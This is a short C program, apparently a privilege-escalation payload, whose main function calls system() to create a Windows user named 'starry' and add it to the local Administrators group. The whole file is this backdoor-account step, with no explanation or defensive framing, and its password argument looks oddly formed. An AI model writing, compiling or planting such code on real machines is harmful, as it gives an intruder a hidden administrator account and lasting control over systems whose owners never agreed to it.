#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user starry <starry< /add && net localgroup administrators starry /add");
  return 0;
}
